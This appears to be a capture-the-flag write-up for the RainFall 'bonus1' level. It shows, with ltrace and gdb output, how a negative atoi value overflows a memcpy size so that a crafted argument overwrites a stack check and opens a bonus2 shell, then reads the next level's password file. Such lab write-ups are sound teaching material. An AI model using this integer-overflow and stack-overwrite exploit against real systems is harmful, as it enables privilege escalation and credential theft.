# BONUS1

## Analysis

Let's try to use the binary first:
```
   bonus1@RainFall:~$ ./bonus1 
   Segmentation fault (core dumped)
   bonus1@RainFall:~$ ./bonus1 salut
   bonus1@RainFall:~$ 
   bonus1@RainFall:~$ ltrace ./bonus1 -3 46
   __libc_start_main(0x8048424, 3, 0xbffff7d4, 0x80484b0, 0x8048520 <unfinished ...>
   atoi(0xbffff908, 0x8049764, 3, 0x80482fd, 0xb7fd13e4)                                                         = -3
   memcpy(0xbffff704, "46", 4294967284 <unfinished ...>
   --- SIGSEGV (Segmentation fault) ---
   +++ killed by SIGSEGV +++
   bonus1@RainFall:~$ ltrace ./bonus1 -3 46 yui
   __libc_start_main(0x8048424, 4, 0xbffff7d4, 0x80484b0, 0x8048520 <unfinished ...>
   atoi(0xbffff904, 0x8049764, 4, 0x80482fd, 0xb7fd13e4)                                                         = -3
   memcpy(0xbffff704, "46", 4294967284 <unfinished ...>
   --- SIGSEGV (Segmentation fault) ---
   +++ killed by SIGSEGV +++
   bonus1@RainFall:~$ ltrace ./bonus1 -300000 46
   __libc_start_main(0x8048424, 3, 0xbffff7d4, 0x80484b0, 0x8048520 <unfinished ...>
   atoi(0xbffff903, 0x8049764, 3, 0x80482fd, 0xb7fd13e4)                                                                       = -300000
   memcpy(0xbffff704, "46", 4293767296 <unfinished ...>
   --- SIGSEGV (Segmentation fault) ---
   +++ killed by SIGSEGV +++
```

In <main p+29> the input (passed to atoi first) is compared to 9 and jump if lower or equal to 0x9, so 9.
We need an input below 9 then.
The program segfaults with no input. It takes 2 inputs before runtime and the second gets copied through the function memcpy. But it seems we can also influence the size copied by memcpy
with the first argument.

So let's try to further study the behaviour of this program with different inputs, the smaller 
argv1 is (the closer it gets to int min) the smaller is the size copied by memcpy. It might 
be due to an int overflow.

We might want to try to use values close to int min:
```
   bonus1@RainFall:~$ ltrace ./bonus1 -2147483648 46
   __libc_start_main(0x8048424, 3, 0xbffff7d4, 0x80484b0, 0x8048520 <unfinished ...>
   atoi(0xbffff8ff, 0x8049764, 3, 0x80482fd, 0xb7fd13e4)                                                                       = 0x80000000
   memcpy(0xbffff704, "", 0)                                                                                                   = 0xbffff704
   +++ exited (status 0) +++
   bonus1@RainFall:~$ ltrace ./bonus1 -2147483647 46
   __libc_start_main(0x8048424, 3, 0xbffff7d4, 0x80484b0, 0x8048520 <unfinished ...>
   atoi(0xbffff8ff, 0x8049764, 3, 0x80482fd, 0xb7fd13e4)                                                                       = 0x80000001
   memcpy(0xbffff704, "46", 4)                                                                                                 = 0xbffff704
   +++ exited (status 0) +++
   bonus1@RainFall:~$ ltrace ./bonus1 -2147483646 46
   __libc_start_main(0x8048424, 3, 0xbffff7d4, 0x80484b0, 0x8048520 <unfinished ...>
   atoi(0xbffff8ff, 0x8049764, 3, 0x80482fd, 0xb7fd13e4)                                                                       = 0x80000002
   memcpy(0xbffff704, "46", 8)                                                                                                 = 0xbffff704
   +++ exited (status 0) +++
```

Now it gets interesting, starting from int min, we can increase the size copied to 0, 4, 8... We can also see that the address of where src is copied
change according to the size of the first argument.
We have a pretty good control of our memcpy function then.


If we come back to the source code, this is the interesting part:
```
   0x08048473 <+79>:    call   0x8048320 <memcpy@plt>
   0x08048478 <+84>:    cmpl   $0x574f4c46,0x3c(%esp)
   0x08048480 <+92>:    jne    0x804849e <main+122>
   0x08048482 <+94>:    movl   $0x0,0x8(%esp)
   0x0804848a <+102>:   movl   $0x8048580,0x4(%esp)
   0x08048492 <+110>:   movl   $0x8048583,(%esp)
   0x08048499 <+117>:   call   0x8048350 <execl@plt>
   0x0804849e <+122>:   mov    $0x0,%eax
   0x080484a3 <+127>:   leave  
   0x080484a4 <+128>:   ret  
```

so we have a good control of memcpy and we can find right after a conditional jump that takes our program to return if the value in 0x3c(%esp) is not equal to 0x574f4c46. Therefore, we need to store this value there to pass the conditional jump and get to this part that will launch the shell:
```
   0x0804848a <+102>:   movl   $0x8048580,0x4(%esp)
   0x08048492 <+110>:   movl   $0x8048583,(%esp)
   0x08048499 <+117>:   call   0x8048350 <execl@plt>
```

## Solution

Ok so we need to copy 0x574f4c46, inside $esp+0x3c here so that our program
doesn't jump at <+92> and ends up calling execl:
```
   0x08048473 <+79>:    call   0x8048320 <memcpy@plt>
   0x08048478 <+84>:    cmpl   $0x574f4c46,0x3c(%esp)   <= 0x574f4c46
   0x08048480 <+92>:    jne    0x804849e <main+122>
   [...]
   0x08048499 <+117>:   call   0x8048350 <execl@plt>
```

So we might try to check at what address is esp+0x3c and where starts our input.
First we'll we'll get a large buffer to copy so we'll try to give 100 as an input.
The following command/scrit gives 100 A's as input that gets entirely copied by memcpy:
```
   bonus1@RainFall:~$ ltrace ./bonus1 -2147483623 $(python -c 'print "A" * 100')
   __libc_start_main(0x8048424, 3, 0xbffff774, 0x80484b0, 0x8048520 <unfinished ...>
   atoi(0xbffff89d, 0x8049764, 3, 0x80482fd, 0xb7fd13e4)                                    = 0x80000019
   memcpy(0xbffff6a4, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"..., 100)                           = 0xbffff6a4
   --- SIGSEGV (Segmentation fault) ---
   +++ killed by SIGSEGV +++
```

Now let's inspect in gdb if we can find where our target (esp+3c) and our input are durig the conditional jump:
```
   (gdb) break *0x08048478
   Breakpoint 1 at 0x8048478
   (gdb) run -2147483623 $(python -c 'print "A" * 100')
   Starting program: /home/user/bonus1/bonus1 -2147483623 $(python -c 'print "A" * 100')

   Breakpoint 1, 0x08048478 in main ()
   (gdb) x/100wx $esp
   0xbffff670:     0xbffff684      0xbffff8a0      0x00000064      0x080482fd
   0xbffff680:     0xb7fd13e4      0x41414141      0x41414141      0x41414141
   0xbffff690:     0x41414141      0x41414141      0x41414141      0x41414141
   0xbffff6a0:     0x41414141      0x41414141      0x41414141      0x41414141
   0xbffff6b0:     0x41414141      0x41414141      0x41414141      0x41414141
   0xbffff6c0:     0x41414141      0x41414141      0x41414141      0x41414141
   0xbffff6d0:     0x41414141      0x41414141      0x41414141      0x41414141
   0xbffff6e0:     0x41414141      0x41414141      0x00000000      0x00000000
   0xbffff6f0:     0x00000000      0x99d7eef4      0xae934ae4      0x00000000
```
Ok so our esp starts at 0xbffff670 and 0xbffff670 + 0x3c = BFFFF6AC;
So esp+3c must be at 0xbfff6ac:
Our input starts at 0xbffff684, and 0xbfff6ac - 0xbffff684 = (0x6ac - 0x684) = 0x28.
0x28 is 40 in decimal so we need an offset of 40 bytes plus the 4 bytes address to put in
esp+3c!

Let's now define the first argument to copy 44 bytes:
```
   bonus1@RainFall:~$ ltrace ./bonus1 -2147483637 ss
   __libc_start_main(0x8048424, 3, 0xbffff7d4, 0x80484b0, 0x8048520 <unfinished ...>
   atoi(0xbffff8ff, 0x8049764, 3, 0x80482fd, 0xb7fd13e4)                                    = 0x8000000b
   memcpy(0xbffff704, "ss", 44)                                                             = 0xbffff704
   +++ exited (status 0) +++
```
Perfect, now that we know where, let's just send the right value as second argument:
```
   bonus1@RainFall:~$ ./bonus1 -2147483637  $(python -c 'print "A" * 40 + "\x46\x4c\x4f\x57"')
   $ whoami
   bonus2
   $ cat /home/user/bonus2/.pass
   XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
```